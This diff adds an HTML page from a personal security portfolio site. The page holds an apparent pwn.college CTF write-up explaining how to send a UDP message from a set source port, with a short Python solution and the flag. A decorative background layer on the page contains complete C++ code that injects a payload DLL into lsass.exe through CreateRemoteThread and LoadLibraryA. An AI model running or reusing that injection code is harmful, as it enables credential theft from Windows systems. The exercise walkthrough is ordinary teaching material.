@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>📡 UDP2 – 'Set the Source Port'</title>
+    <meta name="description" content="A digital garden for System Exploitation & Reverse Engineering.">
+    
+    <!-- Open Graph Metadata -->
+    <meta property="og:title" content="📡 UDP2 – 'Set the Source Port'" />
+    <meta property="og:description" content="System Exploitation and Reverse Engineering Portfolio" />
+    <meta property="og:type" content="website" />
+    <meta property="og:image" content="http://localhost:4000/assets/img/re_background.png" />
+    
+    <link rel="stylesheet" href="/assets/css/style.css">
+</head>
+<body>
+    <!-- Authentic Code Background Layer (Windows Exploit Context) -->
+    <div id="bg-code-layer" aria-hidden="true">
+#include &lt;windows.h&gt;
+#include &lt;iostream&gt;
+#include &lt;tlhelp32.h&gt;
+
+// Internal structures for PEB and API Hooking
+typedef struct _UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+} UNICODE_STRING, *PUNICODE_STRING;
+
+DWORD FindProcessId(const std::wstring& processName) {
+    PROCESSENTRY32 processInfo;
+    processInfo.dwSize = sizeof(processInfo);
+
+    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+    if (processesSnapshot == INVALID_HANDLE_VALUE) return 0;
+
+    Process32First(processesSnapshot, &processInfo);
+    if (!processName.compare(processInfo.szExeFile)) {
+        CloseHandle(processesSnapshot);
+        return processInfo.th32ProcessID;
+    }
+
+    while (Process32Next(processesSnapshot, &processInfo)) {
+        if (!processName.compare(processInfo.szExeFile)) {
+            CloseHandle(processesSnapshot);
+            return processInfo.th32ProcessID;
+        }
+    }
+
+    CloseHandle(processesSnapshot);
+    return 0;
+}
+
+int main() {
+    LPCSTR dllPath = "C:\\Payloads\\KAAAMMUUI_Hook.dll";
+    DWORD processId = FindProcessId(L"lsass.exe");
+
+    if (!processId) {
+        std::cerr << "[-] Target process not found." << std::endl;
+        return 1;
+    }
+
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
+    if (!hProcess) {
+        std::cerr << "[-] Failed to open process." << std::endl;
+        return 1;
+    }
+
+    LPVOID pDllPath = VirtualAllocEx(hProcess, 0, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
+    WriteProcessMemory(hProcess, pDllPath, (LPVOID)dllPath, strlen(dllPath) + 1, 0);
+
+    HANDLE hLoadThread = CreateRemoteThread(hProcess, 0, 0,
+        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"),
+        pDllPath, 0, 0);
+
+    WaitForSingleObject(hLoadThread, INFINITE);
+    VirtualFreeEx(hProcess, pDllPath, strlen(dllPath) + 1, MEM_RELEASE);
+    CloseHandle(hLoadThread);
+    CloseHandle(hProcess);
+
+    std::cout << "[+] Payload successfully injected into memory space." << std::endl;
+    return 0;
+}
+    </div>
+
+    <div class="glow-orb-1"></div>
+    <div class="glow-orb-2"></div>
+
+    <header>
+        <div class="container">
+            <a href="/" class="site-title">KAAAMMUUI</a>
+            <nav>
+                <a href="/" >Home</a>
+                <a href="/projects/" >Projects</a>
+                <a href="/game-modding/" >Game Modding</a>
+                <a href="/writeups/" class="active">CTF Writeups</a>
+                <a href="/notes/" >Notes</a>
+            </nav>
+        </div>
+    </header>
+
+    <main>
+        <div class="container page-layout">
+    <article class="post">
+        <header class="post-header">
+            <h1>📡 UDP2 – 'Set the Source Port'</h1>
+            
+            <p class="post-meta">Published: April 27, 2026</p>
+            
+            
+            <p style="color: var(--text-muted); margin-top: 5px; font-size: 0.9rem;">Tags: </p>
+            
+        </header>
+
+        <div class="post-content" id="post-content">
+            <h2 id="-task">📝 Task</h2>
+
+<p>In this challenge, you’re still working with UDP, but now there’s a twist:<br />
+You’re <strong>required to send your message from a specific source port</strong>, not just the default random one.</p>
+
+<blockquote>
+  <p><strong>Goal:</strong><br />
+From your host at <code class="language-plaintext highlighter-rouge">10.0.0.1</code>, send <code class="language-plaintext highlighter-rouge">Hello, World!\n</code> to <code class="language-plaintext highlighter-rouge">10.0.0.2:31337</code>, but <strong>your source port must be 31338</strong>.</p>
+</blockquote>
+
+<p>The server only replies if it receives the message <strong>from UDP port 31338</strong>.</p>
+
+<hr />
+
+<h2 id="-background-udp-source-ports">🧠 Background: UDP Source Ports</h2>
+
+<p>Normally when you send a UDP message, Linux picks a random source port unless you bind one explicitly.</p>
+
+<h3 id="key-concept">Key Concept:</h3>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">s</span><span class="p">.</span><span class="nf">bind</span><span class="p">((</span><span class="sh">''</span><span class="p">,</span> <span class="o">&lt;</span><span class="n">SOURCE_PORT</span><span class="o">&gt;</span><span class="p">))</span>
+</code></pre></div></div>
+<p>This tells your OS to use the given port when sending data.</p>
+
+<hr />
+
+<h2 id="server-code-analysis-challengerun">Server Code Analysis (/challenge/run)</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>server_socket.bind<span class="o">((</span><span class="s2">"0.0.0.0"</span>, 31337<span class="o">))</span>  <span class="c"># Server listening on UDP port 31337</span>
+
+client_message, <span class="o">(</span>client_host, client_port<span class="o">)</span> <span class="o">=</span> server_socket.recvfrom<span class="o">(</span>1024<span class="o">)</span>
+
+<span class="c"># Only responds if:</span>
+<span class="k">if </span>client_port <span class="o">==</span> 31338 and client_message <span class="o">==</span> b<span class="s2">"Hello, World!</span><span class="se">\n</span><span class="s2">"</span>:
+    server_socket.sendto<span class="o">(</span>flag.encode<span class="o">()</span>, <span class="o">(</span>client_host, client_port<span class="o">))</span>
+</code></pre></div></div>
+<p>So we must:</p>
+<ul>
+  <li>Use destination port 31337</li>
+  <li>Use source port 31338</li>
+  <li>Send exactly Hello, World!\n</li>
+</ul>
+
+<h3 id="solution-python">Solution (Python)</h3>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># udp2.py
+</span><span class="kn">import</span> <span class="n">socket</span>
+
+<span class="n">t_ip</span> <span class="o">=</span> <span class="sh">'</span><span class="s">10.0.0.2</span><span class="sh">'</span>      <span class="c1"># Target IP (server)
+</span><span class="n">dport</span> <span class="o">=</span> <span class="mi">31337</span>          <span class="c1"># Destination port (server)
+</span><span class="n">sport</span> <span class="o">=</span> <span class="mi">31338</span>          <span class="c1"># Required source port
+</span>
+<span class="n">msg</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">Hello, World!</span><span class="se">\n</span><span class="sh">"</span>
+
+<span class="k">with</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_DGRAM</span><span class="p">)</span> <span class="k">as</span> <span class="n">s</span><span class="p">:</span>
+    <span class="n">s</span><span class="p">.</span><span class="nf">bind</span><span class="p">((</span><span class="sh">''</span><span class="p">,</span> <span class="n">sport</span><span class="p">))</span>                      <span class="c1"># Set the source port
+</span>    <span class="n">s</span><span class="p">.</span><span class="nf">sendto</span><span class="p">(</span><span class="n">msg</span><span class="p">,</span> <span class="p">(</span><span class="n">t_ip</span><span class="p">,</span> <span class="n">dport</span><span class="p">))</span>             <span class="c1"># Send message to server
+</span>    <span class="n">data</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">recvfrom</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>               <span class="c1"># Wait for flag
+</span>    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Flag:</span><span class="sh">"</span><span class="p">,</span> <span class="n">data</span><span class="p">.</span><span class="nf">decode</span><span class="p">())</span>
+</code></pre></div></div>
+<hr />
+<h2 id="flag">Flag</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Flag: pwn.college{Itc0GGKtQ7BdQvxVo_g7qra2S89.01M0AjNxwSM0IzMyEzW}
+
+</code></pre></div></div>
+<hr />
+
+        </div>
+    </article>
+    
+    <aside class="toc-container">
+        <div class="toc-sidebar" id="toc-sidebar">
+            <h3>On this page</h3>
+            <ul id="toc-list"></ul>
+        </div>
+    </aside>
+</div>
+
+    </main>
+
+    <footer>
+        <div class="container">
+            <div class="footer-socials" style="margin-bottom: 1rem; display: flex; justify-content: center; gap: 1.5rem;">
+                <a href="https://github.com/HimanshuP601" target="_blank">GitHub</a>
+                <a href="https://www.linkedin.com/in/himanshuparate/" target="_blank">LinkedIn</a>
+                <a href="https://medium.com/@HimanshuP601" target="_blank">Medium</a>
+                <a href="https://pwn.college/hacker/HimanshuP601" target="_blank">pwn.college</a>
+                <a href="mailto:himanshuparate601@gmail.com">Email</a>
+                <span style="color: var(--text-muted);">Discord: himasnhu</span>
+            </div>
+            
+            <div style="margin-bottom: 2rem; display: flex; justify-content: center;">
+                <a href="https://app.hackthebox.com/users/2410266" target="_blank">
+                    <img src="https://www.hackthebox.eu/badge/image/2410266" alt="Hack The Box Badge">
+                </a>
+            </div>
+
+            <p>&copy; 2026 Himanshu. Hosted natively on GitHub Pages.</p>
+        </div>
+    </footer>
+    <script src="/assets/js/main.js"></script>
+</body>
+</html>
